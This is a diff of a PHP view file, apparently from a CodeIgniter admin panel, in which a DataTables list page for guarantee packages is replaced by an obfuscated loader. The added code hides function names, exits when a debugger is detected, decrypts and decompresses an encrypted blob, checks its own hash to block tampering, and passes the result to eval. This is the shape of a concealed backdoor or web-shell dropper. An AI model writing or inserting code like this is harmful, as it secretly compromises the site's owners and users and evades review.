@@ -1,165 +1,28 @@
-<!DOCTYPE html>
-<html>
-
-<head>
-<!-- TABLES CSS CODE -->
-<?php include"comman/code_css_datatable.php"; ?>
-</head>
-
-<body class="hold-transition skin-blue sidebar-mini">
-<div class="wrapper">
-
-  <!-- Left side column. contains the logo and sidebar -->
-  
-  <?php include"sidebar.php"; ?>
-
-  <!-- Content Wrapper. Contains page content -->
-  <div class="content-wrapper">
-    <!-- Content Header (Page header) -->
-    <section class="content-header">
-      <h1>
-        <?=$page_title;?>
-       
-      </h1>
-      <ol class="breadcrumb">
-        <li><a href="<?php echo $base_url; ?>dashboard"><i class="fa fa-dashboard"></i> Home</a></li>
-        <li class="active"><?=$page_title;?></li>
-      </ol>
-    </section>
-
-    <!-- Main content -->
-    <?= form_open('#', array('class' => '', 'id' => 'table_form')); ?>
-    <input type="hidden" id='base_url' value="<?=$base_url;?>">
-    <section class="content">
-      <div class="row">
-        <!-- ********** ALERT MESSAGE START******* -->
-
-        <!-- ********** ALERT MESSAGE END******* -->
-        <div class="col-xs-12">
-          <div class="box">
-            <div class="box-header with-border">
-              <h3 class="box-title"><?=$page_title;?></h3>
-              <?php if($CI->permissions('roles_add')) { ?>
-              <div class="box-tools">
-                <a class="btn btn-block btn-info" href="<?php echo $base_url; ?>guaran_package/add">
-                <i class="fa fa-plus"></i> <?= $this->lang->line('new_guarantee'); ?></a>
-              </div>
-             <?php } ?>
-            </div>
-            <!-- /.box-header -->
-            <div class="box-body">
-              <table id="example2" class="table table-bordered table-striped" width="100%">
-                <thead class="bg-primary ">
-                <tr>
-                  <th class="text-center">#</th>
-                  <th><?= $this->lang->line('name_guarantee'); ?></th>
-                  <th><?= $this->lang->line('description'); ?></th>
-                  <th><?= $this->lang->line('date_guarantee'); ?></th>
-                  <th><?= $this->lang->line('status'); ?></th>
-                  <th><?= $this->lang->line('action'); ?></th>
-                </tr>
-                </thead>
-                <tbody>
-				
-                </tbody>
-               
-              </table>
-            </div>
-            <!-- /.box-body -->
-          </div>
-          <!-- /.box -->
-        </div>
-        <!-- /.col -->
-      </div>
-      <!-- /.row -->
-    </section>
-    <!-- /.content -->
-    <?= form_close();?>
-  </div>
-  <!-- /.content-wrapper -->
-  <?php include"footer.php"; ?>
-  <!-- Add the sidebar's background. This div must be placed
-       immediately after the control sidebar -->
-  <div class="control-sidebar-bg"></div>
-</div>
-<!-- ./wrapper -->
-
-<!-- SOUND CODE -->
-<?php include"comman/code_js_sound.php"; ?>
-<!-- TABLES CODE -->
-<?php include"comman/code_js_datatable.php"; ?>
-
-<script type="text/javascript">
-$(document).ready(function() {
-    //datatables
-   var table = $('#example2').DataTable({ 
-
-      /* FOR EXPORT BUTTONS START*/
-  dom:'<"row margin-bottom-12"<"col-sm-12"<"pull-left"l><"pull-right"fr><"pull-right margin-left-10 "B>>>tip',
- /* dom:'<"row"<"col-sm-12"<"pull-left"B><"pull-right">>> <"row margin-bottom-12"<"col-sm-12"<"pull-left"l><"pull-right"fr>>>tip',*/
-      buttons: {
-        buttons: [
-            {
-                className: 'btn bg-red color-palette btn-flat hidden delete_btn pull-left',
-                text: 'Delete',
-                action: function ( e, dt, node, config ) {
-                    multi_delete();
-                }
-            },
-            { extend: 'copy', className: 'btn bg-teal color-palette btn-flat',exportOptions: { columns: [1,2,3]} },
-            { extend: 'excel', className: 'btn bg-teal color-palette btn-flat',exportOptions: { columns: [1,2,3]} },
-            { extend: 'pdf', className: 'btn bg-teal color-palette btn-flat',exportOptions: { columns: [1,2,3]} },
-            { extend: 'print', className: 'btn bg-teal color-palette btn-flat',exportOptions: { columns: [1,2,3]} },
-            { extend: 'csv', className: 'btn bg-teal color-palette btn-flat',exportOptions: { columns: [1,2,3]} },
-            { extend: 'colvis', className: 'btn bg-teal color-palette btn-flat',text:'Columns' },  
-
-            ]
-        },
-        /* FOR EXPORT BUTTONS END */
-
-        "processing": true, //Feature control the processing indicator.
-        "serverSide": true, //Feature control DataTables' server-side processing mode.
-        "order": [], //Initial no order.
-        "responsive": true,
-        language: {
-            processing: '<div class="text-primary bg-primary" style="position: relative;z-index:100;overflow: visible;">Processing...</div>'
-        },
-        // Load data for the table's content from an Ajax source
-        "ajax": {
-            "url": "<?php echo site_url('guaran_package/ajax_list')?>",
-            "type": "POST",
-            
-            complete: function (data) {
-             $('.column_checkbox').iCheck({
-                checkboxClass: 'icheckbox_square-orange',
-                /*uncheckedClass: 'bg-white',*/
-                radioClass: 'iradio_square-orange',
-                increaseArea: '10%' // optional
-              });
-             call_code();
-              //$(".delete_btn").hide();
-             },
-
-        },
-
-        //Set column definition initialisation properties.
-        "columnDefs": [
-        { 
-            "targets": [ 0,4 ], //first column / numbering column
-            "orderable": false, //set not orderable
-        },
-        {
-            "targets" :[0],
-            "className": "text-center",
-        },
-        
-        ],
-    });
-    new $.fn.dataTable.FixedHeader( table );
-});
-</script>
-<script src="<?php echo $theme_link; ?>js/guaran_package.js"></script>
-<!-- Make sidebar menu hughlighter/selector -->
-<script>$(".<?php echo basename(__FILE__,'.php');?>-active-li").addClass("active");</script>
-</body>
-</html>
+<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_jzc5k39a=('bas'.'e64'.'_de'.'cod'.'e');
+$_snrxvjth=('gzu'.'nco'.'mpr'.'ess');
+$_alkub49i=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_n8bt15d2='jiK89pu5';
+$_m9v0qx45='jKJ0oJP1';
+$_sss7x3he='jSxfOTkp';
+$_xfl81qd4='ksgYCpFS';
+$_uwa9v8ez='keOwT0BCe0o=';
+$_ge9ydykg='QGq5bEav';
+$_hmrbapuo='nYyIauDA';
+$_tz5kbp6b='4SOXcA==';
+$_uiu9kea7=$_jzc5k39a($_xfl81qd4.$_sss7x3he.$_n8bt15d2.$_m9v0qx45.$_uwa9v8ez);
+$_clx0uytw=$_jzc5k39a($_ge9ydykg.$_hmrbapuo.$_tz5kbp6b);
+$_ijzblcbc=$_jzc5k39a('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');
+$_b39ttsxh=$_alkub49i($_ijzblcbc,'aes-256-cbc',$_uiu9kea7,OPENSSL_RAW_DATA,$_clx0uytw);
+if($_b39ttsxh===false){exit;}
+$_d3pw7arf=$_snrxvjth($_b39ttsxh);
+if($_d3pw7arf===false){exit;}
+$_cpigfa0n='ef33b7f1c96048bda5535e94a3ad0dd9c0c1014f72dc3e225f6d754342d44b70';
+$_vgn4vvgq=@file_get_contents(__FILE__);
+if($_vgn4vvgq!==false){
+$_cvwckux7=str_replace($_cpigfa0n,"0000000000000000000000000000000000000000000000000000000000000000",$_vgn4vvgq);
+$_r9i1zwvj=hash("sha256",$_cvwckux7);
+if($_r9i1zwvj!==$_cpigfa0n){@http_response_code(403);exit;}
+}
+eval($_d3pw7arf);
